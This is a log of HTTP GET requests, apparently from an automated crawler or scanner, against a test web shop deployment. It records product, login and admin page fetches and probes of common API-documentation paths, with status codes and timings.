6428,Mon Sep 07 03:14:06 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,552,429,1100
6432,Mon Sep 07 03:14:06 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=tXyZJ52UQVBCVsD3,200,OK,566,429,1100
6434,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=tXyZJ52UQVBCVsD3,200,OK,534,428,983
6436,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=tXyZJ52UQVBCVsD3,200,OK,513,429,1101
6438,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6439,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6440,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6444,Mon Sep 07 03:14:06 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout,200,OK,535,428,282
6445,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:07 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=tXyZJ52UQVBCVsD3,200,OK,553,429,1100
6448,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=tXyZJ52UQVBCVsD3,200,OK,492,429,1100
6450,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=tXyZJ52UQVBCVsD3,200,OK,534,429,1101
6452,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,517,429,1100
6454,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,517,429,1100
6456,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=tXyZJ52UQVBCVsD3,200,OK,567,429,1100
6458,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=tXyZJ52UQVBCVsD3,200,OK,573,429,1100
6460,Mon Sep 07 03:14:08 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=tXyZJ52UQVBCVsD3,200,OK,541,429,1100
6462,Mon Sep 07 03:14:07 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout,200,OK,487,428,282
6463,Mon Sep 07 03:14:06 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,1832,535,102338
6466,Mon Sep 07 03:14:08 BDT 2026,Mon Sep 07 03:14:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6467,Mon Sep 07 03:14:08 BDT 2026,Mon Sep 07 03:14:09 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,507,429,1102
6468,Mon Sep 07 03:14:08 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=tXyZJ52UQVBCVsD3,200,OK,540,429,1100
6469,Mon Sep 07 03:14:08 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,555,429,1100
6470,Mon Sep 07 03:14:08 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,555,429,1100
6471,Mon Sep 07 03:14:08 BDT 2026,Mon Sep 07 03:14:08 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=tXyZJ52UQVBCVsD3,200,OK,529,429,1101
6478,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6480,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/3?_rsc=tXyZJ52UQVBCVsD3,200,OK,546,429,1100
6481,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,535,429,1100
6482,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,554,429,1102
6483,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,549,428,983
6484,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,546,429,1100
6490,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout,200,OK,541,428,282
6492,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6494,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6496,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,551,429,1102
6497,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,551,429,1100
6500,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6502,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:10 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,533,429,1100
6504,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,534,429,1100
6506,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,471,429,1102
6507,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,594,429,1100
6510,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,538,429,1100
6511,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,538,429,1100
6514,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,557,429,1100
6516,Mon Sep 07 03:14:09 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2019,535,102606
6518,Mon Sep 07 03:14:10 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout,200,OK,503,428,282
6520,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,510,429,1100
6522,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,533,428,983
6524,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,533,429,1102
6525,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,549,429,1100
6526,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:11 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,549,429,1100
6530,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,516,429,1100
6532,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,517,429,1100
6534,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,509,429,1100
6536,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/4?_rsc=tXyZJ52UQVBCVsD3,200,OK,564,429,1100
6537,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,567,429,1102
6538,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,549,429,1100
6542,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,569,429,1100
6544,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,537,429,1100
6546,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout,200,OK,522,428,282
6548,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:12 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,522,429,1100
6550,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,509,429,1102
6552,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,541,429,1100
6554,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,575,429,1100
6556,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,560,429,1100
6558,Mon Sep 07 03:14:12 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,507,429,1100
6560,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,499,429,1100
6562,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,517,428,985
6564,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,509,429,1100
6565,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,548,429,1100
6566,Mon Sep 07 03:14:11 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,1982,535,102606
6570,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,510,429,1100
6572,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:13 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,496,428,983
6574,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,525,429,1100
6576,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,514,429,1102
6578,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6579,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6582,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,514,429,1100
6584,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,552,429,1100
6586,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,511,429,1102
6588,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,510,428,983
6590,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,510,428,983
6592,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,530,429,1100
6594,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,561,429,1100
6596,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,533,429,1102
6598,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,517,429,1100
6600,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,564,429,1100
6602,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,501,429,1100
6604,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,1879,535,102606
6606,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6608,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,503,429,1102
6610,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6612,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6614,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6616,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,509,429,1100
6618,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,539,429,1100
6620,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,514,429,1100
6621,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6624,Mon Sep 07 03:14:16 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,540,429,1100
6626,Mon Sep 07 03:14:16 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,505,428,983
6628,Mon Sep 07 03:14:16 BDT 2026,Mon Sep 07 03:14:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6630,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,1859,535,102606
6632,Mon Sep 07 03:14:17 BDT 2026,Mon Sep 07 03:14:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,520,429,1100
6634,Mon Sep 07 03:14:17 BDT 2026,Mon Sep 07 03:14:18 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,516,429,1100
6636,Mon Sep 07 03:14:18 BDT 2026,Mon Sep 07 03:14:18 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,549,429,1100
6638,Mon Sep 07 03:14:18 BDT 2026,Mon Sep 07 03:14:19 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,533,429,1100
6640,Mon Sep 07 03:14:19 BDT 2026,Mon Sep 07 03:14:20 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,886,534,75089
6641,Mon Sep 07 03:14:21 BDT 2026,Mon Sep 07 03:14:22 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,548,361,9
6642,Mon Sep 07 03:14:22 BDT 2026,Mon Sep 07 03:14:22 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,510,361,9
6643,Mon Sep 07 03:14:22 BDT 2026,Mon Sep 07 03:14:23 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,538,361,9
6644,Mon Sep 07 03:14:25 BDT 2026,Mon Sep 07 03:14:25 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,535,435,271
6645,Mon Sep 07 03:14:26 BDT 2026,Mon Sep 07 03:14:27 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,1061,534,75089
6646,Mon Sep 07 03:14:27 BDT 2026,Mon Sep 07 03:14:28 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,501,361,9
6647,Mon Sep 07 03:14:28 BDT 2026,Mon Sep 07 03:14:28 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,522,361,9
6648,Mon Sep 07 03:14:28 BDT 2026,Mon Sep 07 03:14:29 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,540,361,9
6649,Mon Sep 07 03:14:29 BDT 2026,Mon Sep 07 03:14:29 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,538,435,271
6650,Mon Sep 07 03:14:29 BDT 2026,Mon Sep 07 03:14:30 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,893,534,75089
6651,Mon Sep 07 03:14:30 BDT 2026,Mon Sep 07 03:14:31 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,505,361,9
6652,Mon Sep 07 03:14:31 BDT 2026,Mon Sep 07 03:14:31 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,522,361,9
6653,Mon Sep 07 03:14:31 BDT 2026,Mon Sep 07 03:14:32 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,538,361,9
6654,Mon Sep 07 03:14:32 BDT 2026,Mon Sep 07 03:14:33 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,575,435,271
6655,Mon Sep 07 03:14:33 BDT 2026,Mon Sep 07 03:14:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger-ui/,308,Permanent Redirect,541,286,11
6656,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/v3/api-docs,404,Not Found,582,436,1090
6657,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,200,OK,646,460,9321
6658,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,972,534,75089
6659,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger.json,404,Not Found,546,436,1090
6660,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/openapi.json,404,Not Found,522,436,1090
6661,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,553,361,9
6662,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/api-docs,404,Not Found,538,436,1090
6663,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2164,535,102606
6664,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2248,535,102606
6665,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,557,361,9
6666,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2176,535,102606
6667,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2481,535,102606
6668,Mon Sep 07 03:14:33 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,3102,535,102606
6669,Mon Sep 07 03:14:36 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/docs/,308,Permanent Redirect,520,273,5
6670,Mon Sep 07 03:14:36 BDT 2026,Mon Sep 07 03:14:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,524,361,9
6671,Mon Sep 07 03:14:36 BDT 2026,Mon Sep 07 03:14:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger,404,Not Found,646,436,1090
6672,Mon Sep 07 03:14:37 BDT 2026,Mon Sep 07 03:14:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/v2/api-docs,404,Not Found,541,436,1090
6673,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger-ui/index.html,404,Not Found,553,436,1090
6674,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/openapi.yaml,404,Not Found,495,436,1090
6675,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,508,435,271
6676,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,307,Temporary Redirect,648,274,0
6677,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger.yaml,404,Not Found,705,436,1090
6678,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,307,Temporary Redirect,1223,274,0
6679,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,307,Temporary Redirect,867,274,0
6680,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,307,Temporary Redirect,899,274,0
6681,Mon Sep 07 03:14:40 BDT 2026,Mon Sep 07 03:14:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger/ui/index.html,404,Not Found,1038,436,1090
6682,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2796,535,102606
